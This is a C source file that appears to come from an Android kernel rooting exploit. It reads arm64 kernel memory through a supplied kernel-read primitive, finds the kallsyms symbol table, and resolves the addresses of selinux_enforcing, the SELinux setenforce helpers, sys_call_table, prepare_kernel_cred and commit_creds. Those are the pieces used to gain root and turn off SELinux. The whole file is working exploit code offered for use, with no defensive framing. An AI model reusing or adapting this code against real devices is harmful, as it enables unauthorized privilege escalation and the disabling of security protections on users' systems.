#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include "becomeroot.h"
#include "ksyms_search.h"

extern unsigned long KERNEL_START;
extern unsigned long KERNEL_STOP;
extern unsigned MIN_LEN;

extern unsigned long *ks_address ;
extern unsigned long *ks_num ;
extern unsigned long ks_syms_real_num ;
extern unsigned long ks_syms_num ;
extern unsigned char *ks_names ;
extern unsigned long *ks_markers ;
extern unsigned char *ks_token_tab ;
extern unsigned short *ks_token_index ;

#define KERNEL_START_INIT  	0xffffffc000080000UL
#define KERNEL_SEARCH_START 0xffffffc000000000UL
#define KERNEL_STOP_INIT   (KERNEL_SEARCH_START + 1024 * 1024 * 800)

/**
根据符号个数，确定内存大小
50000(个)*2*8=800000=781KB
100000(个)*2*8=1538KB
200000(个)*2*8=3125KB
**/
#define MMAP_SIZE		0x400000
//#define MMAP_SIZE		0x5000000

unsigned long *find_kernel_symbol_tab(void);
unsigned long lookup_sym(const char *name);
void clear_kallsyms_params();
int get_ksyms(void);
void print_kallsyms();

static struct ks_result ks_res = {0};

unsigned long* get_kr_num_addr(unsigned long *ksysm_start_addr, unsigned long mem_end, int* is_next_ok){
	if (NULL == ksysm_start_addr){
		return NULL;
	}
	if( 0 != *ksysm_start_addr && 1 != *is_next_ok){
		while (*ksysm_start_addr >= KERNEL_START_INIT) {
			ksysm_start_addr++; 
			if( (unsigned long)ksysm_start_addr >= mem_end ){
				return NULL;
			}
		} 
	}
	*is_next_ok =1;
	
	if( 0 == *ksysm_start_addr ){
		while (0 == *ksysm_start_addr ){
			ksysm_start_addr++;
			if( (unsigned long)ksysm_start_addr >= mem_end ){
				return NULL;
			}
		}
	}

	return ksysm_start_addr;
}

void write_to_file(const char* filename, void* data, int size){
	FILE* fp;
	
	fp = fopen(filename, "wb");
	if(NULL == fp){
		printf("[--] <write_to_file> failed to write to %s\n", filename);
		return;
	}
	
	fwrite(data, size, 1, fp);
	
	fclose(fp);
}

struct ks_result* find_ksyms(int (*get_kernel_data)(void* kernel_start, void* local_addr, int size)){
	unsigned long search_start0;
	unsigned long *ksysm_start_local_addr;
	unsigned long *ksysm_start_kernel_addr;
	int search_len0;
	void* local0;
	int is_next_ok;
	unsigned long* kr_num_addr;
	unsigned long *kr_num_local_search_addr;
	unsigned long *kr_num_local_search_end_addr;
	unsigned long kr_num_kernel_addr;
	unsigned long kr_num;
	int i; 
	
	local0 = mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(MAP_FAILED == local0){
		printf("[--] <find_ksyms> failed to mmap 0\n");
		return NULL;
	}
	for( search_start0=KERNEL_START_INIT, search_len0=0x18000; search_start0<KERNEL_STOP_INIT; search_start0+=search_len0 ){
		//printf("[++] <find_ksyms> search_start0=%lx\n", search_start0);
		//初步查找
		if( search_len0 != get_kernel_data((void*)search_start0, local0, search_len0) ){
			printf("[--] <find_ksyms> failed to get_kernel_data 1\n");
			return NULL;
		} 
		KERNEL_START = (unsigned long)local0;
		KERNEL_STOP = (unsigned long)local0 + search_len0;
		MIN_LEN = 5000;
		
		if( NULL == (ksysm_start_local_addr=find_kernel_symbol_tab()) ){
			continue;
		}
		
		printf("[++] <find_ksyms> ksysm_start_local_addr=%p\n", ksysm_start_local_addr);
		
		//获取数量
		is_next_ok=0;
		
		kr_num_local_search_addr = ksysm_start_local_addr;
		kr_num_local_search_end_addr = (unsigned long*)((unsigned long)local0 + search_len0);
		kr_num_kernel_addr = search_start0;
		for(i=0;i<1000;i++){
			if(NULL != (kr_num_addr = get_kr_num_addr(kr_num_local_search_addr, (unsigned long)kr_num_local_search_end_addr, &is_next_ok)) ){
				break;
			}
			if(kr_num_local_search_addr != ksysm_start_local_addr){
				munmap(kr_num_local_search_addr, 0x4000);
			}
			kr_num_local_search_addr = (unsigned long *)mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
			if(MAP_FAILED == kr_num_local_search_addr){
				printf("[--] <find_ksyms> failed to mmap 2\n");
				return NULL;
			}
			kr_num_kernel_addr = search_start0+search_len0+i*0x4000;
			if( 0x4000 != get_kernel_data((void*)kr_num_kernel_addr, kr_num_local_search_addr, 0x4000) ){
				printf("[--] <find_ksyms> failed to get_kernel_data 2\n");
				return NULL;
			}
			kr_num_local_search_end_addr = (unsigned long*)((unsigned long)kr_num_local_search_addr + 0x4000);
		}
		if(NULL == kr_num_addr){
			printf("[--] <find_ksyms> failed to find kr_num_addr\n");
			return NULL;
		}
		
		kr_num = *kr_num_addr;
		printf("[++] <find_ksyms> kr_num=%ld\n", kr_num);
		
		if(kr_num_local_search_addr != ksysm_start_local_addr){
			munmap(kr_num_local_search_addr, 0x4000);
		}
		
		//计算 ksysm_start_kernel_addr 为近似地址
		if( kr_num_local_search_addr == ksysm_start_local_addr ){
			ksysm_start_kernel_addr = (unsigned long *)( search_start0 + ((unsigned long)kr_num_addr - (unsigned long)local0) - kr_num * sizeof(void*) );
		}else{
			ksysm_start_kernel_addr = (unsigned long *)( kr_num_kernel_addr + ((unsigned long)kr_num_addr - (unsigned long)kr_num_local_search_addr) - kr_num * sizeof(void*) );
		}
		
		ksysm_start_kernel_addr = (unsigned long*)( (unsigned long)ksysm_start_kernel_addr - 0x2000 ) ;
		printf("[++] <find_ksyms> ksysm_start_kernel_addr=%p\n", ksysm_start_kernel_addr);
		
		//查找真正的 ksysm_start_kernel_addr 地址
		if( MMAP_SIZE != get_kernel_data((void*)ksysm_start_kernel_addr, local0, MMAP_SIZE)  ){
			printf("[--] <find_ksyms> failed to get_kernel_data 3\n");
			return NULL;
		}
		
		printf("[++] <find_ksyms> local map ******** %p~%p\n", local0, (void*)((unsigned long)local0 + MMAP_SIZE));
		
		clear_kallsyms_params();
		KERNEL_START = (unsigned long)local0;
		KERNEL_STOP = (unsigned long)local0 + MMAP_SIZE;
		MIN_LEN = 10000;
		
		
		//get_ksyms(); 
		//write_to_file("/data/local/tmp/mem.dmp", local0, MMAP_SIZE);
		
		ks_res.selinux_enforcing_addr = (int*)lookup_sym(selinux_enforcing_name);
		ks_res.selnl_notify_setenforce = (selnl_notify_setenforce_func)lookup_sym(selnl_notify_setenforce_name);
		ks_res.selinux_status_update_setenforce = (selinux_status_update_setenforce_func)lookup_sym(selinux_status_update_setenforce_name);
		ks_res.sys_call_table_addr = (unsigned long*)lookup_sym(sys_call_table_name);
		ks_res.prepare_kernel_cred = (prepare_kernel_cred_func)lookup_sym(prepare_kernel_cred_name);
		ks_res.commit_creds = (commit_creds_func)lookup_sym(commit_creds_name); 
		ks_res.ks_address = (void*)((unsigned long)ks_address - (unsigned long)local0 + (unsigned long)ksysm_start_kernel_addr);
		ks_res.kr_num = ks_syms_real_num;
		
		/*
		printf("\n[++] <find_ksyms> **********************\n");
		printf("[++] <find_ksyms> ks_address=%p, offset=%lx\n", ks_address, (unsigned long)ks_address-(unsigned long)local0);
		printf("[++] <find_ksyms> ks_num=%p, offset=%lx\n", ks_num, (unsigned long)ks_num-(unsigned long)local0);
		printf("[++] <find_ksyms> ks_names=%p, offset=%lx\n", ks_names, (unsigned long)ks_names-(unsigned long)local0);
		printf("[++] <find_ksyms> ks_markers=%p, offset=%lx\n", ks_markers, (unsigned long)ks_markers-(unsigned long)local0);
		printf("[++] <find_ksyms> ks_token_tab=%p, offset=%lx\n", ks_token_tab, (unsigned long)ks_token_tab-(unsigned long)local0);
		printf("[++] <find_ksyms> ks_token_index=%p, offset=%lx\n", ks_token_index, (unsigned long)ks_token_index-(unsigned long)local0);
		printf("[++] <find_ksyms> **********************\n\n");
		*/
		
		//return
		munmap(local0, MMAP_SIZE);
		
		return &ks_res;
		
		break;
	}
	munmap(local0, MMAP_SIZE);
	return NULL;
}

void print_kr_result(struct ks_result* ks_res){
	printf("\n[++] <find_ksyms> **************************\n");
	printf("[++] <find_ksyms> ks_address=%p\n", ks_res->ks_address);
	printf("[++] <find_ksyms> kr_num=%ld\n", ks_res->kr_num);
	printf("[++] <find_ksyms> selinux_enforcing_addr=%p\n", ks_res->selinux_enforcing_addr);
	printf("[++] <find_ksyms> selnl_notify_setenforce=%p\n", ks_res->selnl_notify_setenforce);
	printf("[++] <find_ksyms> selinux_status_update_setenforce=%p\n", ks_res->selinux_status_update_setenforce);
	printf("[++] <find_ksyms> sys_call_table_addr=%p\n", ks_res->sys_call_table_addr);
	printf("[++] <find_ksyms> prepare_kernel_cred=%p\n", ks_res->prepare_kernel_cred);
	printf("[++] <find_ksyms> commit_creds=%p\n", ks_res->commit_creds);
	printf("[++] <find_ksyms> **************************\n\n");
}


